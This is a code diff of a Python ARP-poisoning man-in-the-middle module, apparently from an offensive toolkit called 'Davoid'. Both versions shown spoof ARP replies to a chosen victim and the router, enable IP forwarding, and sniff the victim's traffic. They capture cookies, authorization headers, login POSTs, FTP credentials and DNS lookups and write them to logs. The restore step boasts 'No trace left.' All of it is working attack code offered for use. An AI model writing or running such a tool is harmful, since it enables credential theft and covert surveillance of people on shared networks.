@@ -1,187 +1,171 @@
 import os
+import sys
 import time
 import threading
-import sys
-import logging
 import questionary
-from scapy.all import ARP, sendp, Ether, srp, IP, TCP, Raw, conf, get_if_list, sniff
 from rich.console import Console
-from rich.table import Table
 from core.ui import draw_header, Q_STYLE
+from core.context import ctx
+from core.database import db
 
-# Suppress Scapy IPv6 warning and set logging
+# Suppress noisy Scapy IPv6 warnings
+import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-console = Console()
 
+try:
+    import scapy.all as scapy
+except ImportError:
+    pass
+
+console = Console()
 
 class MITMEngine:
     def __init__(self):
-        self.stop_event = threading.Event()
-        self.interface = ""
+        self.target_ip = ""
         self.gateway_ip = ""
-        self.targets = []  # List of (IP, MAC) tuples
-        self.threads = []
-
-    def check_privileges(self):
-        """Ensures the script is running with root/admin privileges."""
-        if os.getuid() != 0:
-            console.print(
-                "[bold red][!] Error: This script must be run as root (sudo).[/bold red]")
-            sys.exit(1)
-
-    def toggle_forwarding(self, state=True):
-        """Enables IP forwarding across macOS and Linux with error handling."""
-        val = 1 if state else 0
-        try:
-            if sys.platform == 'darwin':
-                os.system(
-                    f"sudo sysctl -w net.inet.ip.forwarding={val} > /dev/null")
-            elif sys.platform.startswith('linux'):
-                os.system(
-                    f"echo {val} | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
-            console.print(
-                f"[*] IP Forwarding {'enabled' if state else 'disabled'}.")
-        except Exception as e:
-            console.print(
-                f"[yellow][!] Forwarding config failed: {e}[/yellow]")
+        self.target_mac = ""
+        self.gateway_mac = ""
+        self.is_poisoning = False
 
     def get_mac(self, ip):
-        """Resolves MAC address with high-retry logic and ARP requests."""
+        """Resolves the MAC address of a given IP using ARP requests."""
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
+        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+        
+        if answered_list:
+            return answered_list[0][1].hwsrc
+        return None
+
+    def toggle_ip_forwarding(self, enable=True):
+        """Modifies the OS kernel to forward packets so the victim's internet doesn't break."""
+        val = "1" if enable else "0"
+        state = "Enabling" if enable else "Disabling"
+        console.print(f"[*] {state} IP Forwarding at the OS level...")
+        
         try:
-            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
-                         timeout=3, retry=3, verbose=False, iface=self.interface)
-            if ans:
-                return ans[0][1].hwsrc
-            return None
+            if sys.platform == "darwin":  # macOS
+                os.system(f"sysctl -w net.inet.ip.forwarding={val} > /dev/null 2>&1")
+            else:  # Linux
+                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+                    f.write(val)
         except Exception as e:
-            console.print(f"[red][!] Error resolving MAC for {ip}: {e}[/red]")
-            return None
+            console.print(f"[bold red][!] Could not toggle IP forwarding (Requires sudo):[/bold red] {e}")
 
-    def packet_callback(self, packet):
-        """Live Session Intelligence: Extracts sensitive data from plaintext streams."""
-        if packet.haslayer(Raw) and packet.haslayer(IP):
+    def poison_loop(self):
+        """Runs in the background, constantly feeding fake ARP packets."""
+        while self.is_poisoning:
             try:
-                load = packet[Raw].load.decode('utf-8', errors='ignore')
-                # Detect Session Identifiers and common credentials
-                keywords = ["Cookie:", "Authorization:",
-                            "user=", "pass=", "token="]
-                if any(key in load for key in keywords):
-                    src_ip = packet[IP].src
-                    dst_ip = packet[IP].dst
-                    console.print(
-                        f"[bold red][!] INTEL INTERCEPTED ({src_ip} -> {dst_ip}):[/bold red] Potential Sensitive Data")
-
-                    if not os.path.exists("logs"):
-                        os.makedirs("logs")
-                    with open("logs/session_tokens.txt", "a") as f:
-                        f.write(
-                            f"--- {time.ctime()} ---\nSource: {src_ip}\nPayload: {load}\n\n")
+                # Tell Target we are the Gateway
+                scapy.send(scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip), verbose=False)
+                # Tell Gateway we are the Target
+                scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip), verbose=False)
+                time.sleep(2)
             except Exception:
                 pass
 
-    def poison(self, target_ip, target_mac, gateway_mac):
-        """Asynchronous poisoning loop for a target."""
-        # Packet to tell target we are the router
-        target_pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
-                                               hwdst=target_mac, psrc=self.gateway_ip)
-        # Packet to tell router we are the target
-        router_pkt = Ether(dst=gateway_mac)/ARP(op=2,
-                                                pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+    def restore_network(self):
+        """Heals the network by sending the correct MAC addresses to both parties."""
+        console.print("\n[yellow][*] Healing the network ARP tables...[/yellow]")
+        self.is_poisoning = False
+        self.toggle_ip_forwarding(enable=False)
+        
+        try:
+            # Restore Target
+            scapy.send(scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac), count=5, verbose=False)
+            # Restore Gateway
+            scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac), count=5, verbose=False)
+            console.print("[bold green][+] Network successfully restored. No trace left.[/bold green]")
+        except Exception:
+            pass
 
-        while not self.stop_event.is_set():
-            try:
-                sendp(target_pkt, verbose=False, iface=self.interface)
-                sendp(router_pkt, verbose=False, iface=self.interface)
-                time.sleep(2)
-            except Exception:
-                break
-
-    def restore(self, target_ip, target_mac, gateway_mac):
-        """Restores ARP tables to original state using the correct MACs."""
-        console.print(f"[*] Restoring network for {target_ip}...")
-        res_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
-                                               hwdst=target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac)
-        res_router = Ether(dst=gateway_mac)/ARP(op=2, pdst=self.gateway_ip,
-                                                hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
-        for _ in range(7):  # Multiple sends to ensure the update is received
-            sendp(res_target, verbose=False, iface=self.interface)
-            sendp(res_router, verbose=False, iface=self.interface)
-            time.sleep(0.2)
-
-    def run(self):
-        self.check_privileges()
-        draw_header("MITM Engine: Subnet Dominator")
-
-        # Interface Discovery
-        ifaces = get_if_list()
-
-        self.interface = questionary.select(
-            "Select Interface:",
-            choices=ifaces,
-            style=Q_STYLE
-        ).ask()
-
-        if not self.interface:
+    def process_packet(self, packet):
+        """Deep Packet Inspection: Analyzes forwarded traffic for sensitive data."""
+        if not packet.haslayer(scapy.IP):
             return
 
-        self.gateway_ip = questionary.text(
-            "Gateway (Router) IP:", style=Q_STYLE).ask()
-        target_input = questionary.text(
-            "Target IP or Range (e.g. 192.168.1.5):", style=Q_STYLE).ask()
+        # Only inspect packets from our victim
+        if packet[scapy.IP].src != self.target_ip and packet[scapy.IP].dst != self.target_ip:
+            return
 
-        gw_mac = self.get_mac(self.gateway_ip)
-        if not gw_mac:
-            return console.print("[red]Could not resolve Gateway MAC. Check connection.[/red]")
-        console.print(f"[green][+] Resolved Gateway MAC: {gw_mac}[/green]")
+        # 1. Catch DNS Requests (See what websites they are visiting)
+        if packet.haslayer(scapy.DNSQR):
+            query = packet[scapy.DNSQR].qname.decode('utf-8', errors='ignore').strip('.')
+            console.print(f"[cyan][DNS][/cyan] Victim requested: [white]{query}[/white]")
+            db.log("MITM-DNS", self.target_ip, f"Requested domain: {query}", "INFO")
 
-        # Subnet Resolution
-        console.print("[*] Mapping subnet targets...")
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_input),
-                     timeout=2, verbose=False, iface=self.interface)
+        # 2. Catch Raw TCP Payloads (HTTP/FTP/Telnet Passwords)
+        if packet.haslayer(scapy.Raw):
+            try:
+                payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
+                
+                # Look for POST requests (often contain logins) or FTP commands
+                if any(keyword in payload for keyword in ["POST ", "USER ", "PASS ", "login", "password"]):
+                    console.print(f"\n[bold red][!] INTERCEPTED SENSITIVE PAYLOAD:[/bold red]")
+                    
+                    # Extract just the first few lines to keep terminal clean
+                    lines = payload.split('\n')[:5]
+                    for line in lines:
+                        console.print(f"    [yellow]{line.strip()}[/yellow]")
+                        
+                    db.log("MITM-Payload", self.target_ip, f"Captured Traffic:\n{payload}", "HIGH")
+            except:
+                pass
 
-        for _, rcv in ans:
-            if rcv.psrc != self.gateway_ip:
-                self.targets.append((rcv.psrc, rcv.hwsrc))
+    def run(self):
+        draw_header("Adversary-in-the-Middle (ARP Poisoning & Sniffer)")
+        
+        if os.getuid() != 0:
+            console.print("[bold red][!] MITM attacks require raw socket access. Please restart Davoid with 'sudo'.[/bold red]")
+            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+            return
 
-        if not self.targets:
-            return console.print("[red]No active targets found on the specified range.[/red]")
+        # Try to pull the gateway from the context, or prompt user
+        default_gw = ctx.get("GATEWAY") or "192.168.1.1"
+        self.gateway_ip = questionary.text("Gateway/Router IP:", default=default_gw, style=Q_STYLE).ask()
+        if not self.gateway_ip: return
+        
+        self.target_ip = questionary.text("Victim IP Address:", style=Q_STYLE).ask()
+        if not self.target_ip: return
 
-        # Start Poisoning
-        self.toggle_forwarding(True)
-        console.print(
-            f"[bold green][+] Poisoning {len(self.targets)} targets...[/bold green]")
+        with console.status("[bold cyan]Resolving MAC addresses...", spinner="bouncingBar"):
+            self.target_mac = self.get_mac(self.target_ip)
+            self.gateway_mac = self.get_mac(self.gateway_ip)
 
-        for ip, mac in self.targets:
-            t = threading.Thread(target=self.poison, args=(
-                ip, mac, gw_mac), daemon=True)
-            t.start()
-            self.threads.append(t)
+        if not self.target_mac:
+            console.print(f"[bold red][!] Could not find MAC address for Victim ({self.target_ip}). Are they online?[/bold red]")
+            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+            return
+            
+        if not self.gateway_mac:
+            console.print(f"[bold red][!] Could not find MAC address for Gateway ({self.gateway_ip}).[/bold red]")
+            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+            return
 
-        console.print(
-            "[bold red][!] Interception Active. Press Ctrl+C to stop and restore network.[/bold red]")
+        console.print(f"[+] Victim MAC: [cyan]{self.target_mac}[/cyan]")
+        console.print(f"[+] Gateway MAC: [cyan]{self.gateway_mac}[/cyan]\n")
+
+        # Engage routing and background thread
+        self.toggle_ip_forwarding(enable=True)
+        self.is_poisoning = True
+        poison_thread = threading.Thread(target=self.poison_loop, daemon=True)
+        poison_thread.start()
+
+        console.print("[bold green][*] ARP Poisoning active. Victim traffic is now flowing through Davoid.[/bold green]")
+        console.print("[dim]Note: Modern HTTPS traffic will be encrypted. You will only see DNS requests and cleartext payloads.[/dim]")
+        console.print("[bold yellow][!] Sniffing packets... (Press Ctrl+C to stop and heal network)[/bold yellow]\n")
 
         try:
-            # Sniff only HTTP/Plaintext traffic to maximize performance
-            sniff(iface=self.interface, prn=self.packet_callback,
-                  store=0, filter="tcp port 80 or tcp port 8080 or tcp port 443")
+            # Sniff exclusively on the victim's traffic
+            scapy.sniff(prn=self.process_packet, store=False, filter=f"host {self.target_ip}")
         except KeyboardInterrupt:
-            console.print("\n[yellow][!] Shutdown signal received...[/yellow]")
-        finally:
-            self.stop_event.set()
-            for ip, mac in self.targets:
-                self.restore(ip, mac, gw_mac)
-            self.toggle_forwarding(False)
-            console.print(
-                "[bold green][+] Network Restored Successfully.[/bold green]")
-
-
-def start_mitm():
-    try:
-        engine = MITMEngine()
-        engine.run()
-    except Exception as e:
-        console.print(f"[red][!] Fatal Error: {e}[/red]")
-
+            self.restore_network()
+        except Exception as e:
+            console.print(f"[bold red][!] Sniffer crashed:[/bold red] {e}")
+            self.restore_network()
+            
+        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
 
 if __name__ == "__main__":
-    start_mitm()
+    MITMEngine().run()
